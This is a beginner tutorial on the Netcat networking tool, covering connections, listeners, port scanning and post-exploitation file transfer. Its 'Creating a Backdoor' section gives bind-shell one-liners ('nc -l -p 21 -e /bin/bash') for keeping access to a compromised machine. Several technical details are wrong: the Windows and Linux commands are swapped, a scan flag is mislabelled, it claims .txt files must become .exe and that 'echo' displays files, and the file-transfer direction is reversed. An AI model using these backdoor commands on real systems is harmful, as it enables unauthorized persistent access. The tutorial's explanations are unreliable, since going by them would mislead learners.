### Introduction to Netcat
`Netcat` is a network analysis tool developed to be used by security specialists and also hackers to analyze a network in traffic.
It is considered a `Swiss-army` knife in information technology.

At its early stages, netcat was developed to open up UDP/TCP connections between two machines from any port you desire.
Over time, it has been improved and now it is used for port scanning, port forwarding, file transfer, and also remote administration. This article will help us understand how Netcat performs these roles.

Netcat can further be used as a back-end device that can be used or driven by other programs or scripts.
It is also a must-have tool for pen-tester since it is essential for network debugging and investigation.

#### Executing Commands on Netcat
Netcat is only available in the command-line interface. You will be able to access Netcat on the `Command Line` on Windows and `Bash Terminal` on Linux. Below is the common Netcat Syntax.

`nc [options][target_ip address][port]`

Let's now discuss some actions that can be executed via Netcat.

1. **Help**

For a start you might want to know the commands you will interact with within your Netcat journey.
* Run the `nc -help` or `nc -h` command to list all the commands available in Netcat as shown below.

![Help Command Output](/engineering-education/Introduction-to-Netcat/help.png)

2. **Connecting Server**

To achieve this, you will have to access a port where a particular service is running and execute the code with the syntax linking it with the Netcat commands. The syntax is as shown below.
* ` nc [IP Address] [Port Number]` - both for the target machine.

example: `nc 192.168.234.128 8080`

For our example above, we have connected the internet accessing service via port number 8080 with the IP address 192.168.234.128.

3. **Connecting 2 Machines**

To do this, we will have to set one device as the `Initiator` and the other device as the `listener`. For our case, we will use Kali Linux as the Initiator and the Windows Machine as the Listener.

**Creating Listener** - First, let us create the listening Machine which in our case is Windows 10. To successfully do so, run the following Netcat command.

`nc -lvp 4444`

From the above command:
* `l` - Setting up Listening Mode
* `v` - Setting Verbose
* `p` - Setting up Port Number.

**Creating Initiator** - Creating the Initiator is simpler as you will only be required to run the Ip address of the Listening machine followed by the port number. The syntax is as shown below.

`nc 192.168.234.128 8080`

4. **Creating a Backdoor**

After getting a Meterpreter shell back or successfully exploiting a device, you will want to maintain your access so you may come back to the target device at any time. That is where Netcat comes in. With Netcat, you can run a one-line command to achieve so. 

Creating a backdoor for a Linux and Windows OS target is different.

For the case of Windows: `nc -l -p 21 -e /bin/bash`

For Linux: `nc -l -p 21 -e hack.exe`

5. **Saving Output**

Information Gathering is one of the important fundamentals in Penetration testing to save the information gathered. To save the output from Netcat, we will use the parameter `-o` followed by the location to save the output as shown below.

`nc 192.168.234.128 8080 -v -o /Desktop/Output.txt`

#### Modes of running Netcat  
We have two common modes of running Netcat. 

1. **Client Mode/ Initiator Mode**
- As we have discussed earlier, the Client or Initiator Mode always initiates the connection with the listener. 

2. **Listener Mode**
- To set up the Listener, we will require the `Port` Number. The syntax will also contain the `listening` and `verbose` commands.

#### Uses of Netcat
1. **Port Scanning**

For every hacker or penetration tester, before performing any attack, you need to spot weak links or vulnerabilities in a target system. There are several ways to achieve this and one of them is `port scanning`.

Port scanning is the act of running a network analysis on a system to determine open or closed ports on a specific target machine. This can be done by specifying the IP address of the target machine and setting up some parameters as seen in the syntax below.
```
    $ nc -v -w2 -z [target_ip] 20-40
```
From the example above, the parameters are set to perform the following actions.

* `-v` **(Verbose)** -  To give detailed information about the port being scanned.
* `-z` - Prevents sending data to any TCP and this enables for fast scanning of ports.
* `-i` - It insets a delay between each port probe to limit scanning speed.

Even though Netcat can be used for Port Scanning, it is however not the top-ranked tool for port scanning. The most recommended tool is [NMAP](https://www.section.io/engineering-education/nmap-network-scanner/).


2. **Data/ File Transfer**

After successfully exploiting a target machine and you have control over it. You will need Netcat for the post-exploitation phase. This is where you remotely run commands on the target machine using your local machine. For some cases, you might want to transfer files or some data into the local machine which is mostly a Kali Linux machine since it is the recommended OS for Penetrating testing. To learn more on [Kali Linux](https://www.section.io/engineering-education/getting-started-with-kali-linux/) go through the article linked.

Let's now see how we can achieve that via Netcat.

**Example:**

Let us take a sample text named `test.txt` which in this case is in our targets device storage. To transfer the file into our local machine, run the Netcat command below on the target device either remotely or physically. This is to purposefully set up a listener on the target device.
```
    $ nc –l –p 21 >test.txt
```
From the above,

You can see that we have specified the port number 21 by preceding the `-p` command which is used to initialize the port number.

We have set up the machine to the listening mode by using the `-l` command.

After successfully setting up a listener, now it's time to set up an Initiator on our local machine.
We can do so by running the following command.
```
    $ nc destination 21 <test.txt
```

As you have noted by now, we have set up client mode to connect to any listener open on port 21. We have to state the `destination` of our initiator by providing the listening port number and the name of the file to transfer.

To show the output of what is contained in the File, run the `type` command on Windows and the `echo` command on Kali Linux.
```
    $ type test.txt
```
For Kali Linux, you will have to convert the .txt file to executable format `.exe` since Kali Linux cannot run Windows files with the `.txt` extension.
```
    $ echo test.exe
```

#### Conclusion
From what we have learned, we can agree that Netcat is a must-have tool for a penetration tester. It is easy to learn and its tools allow for the execution of a wide range of actions as mentioned in the tutorial and therefore recommended for Penetration Testing.

#### Summary
In this article, we have gone through the following 
1. Introduction to Netcat.
2. Executiong commands.
2. Modes of running Netcat.
3. General Netcat commands.
4. Uses of Netcat.
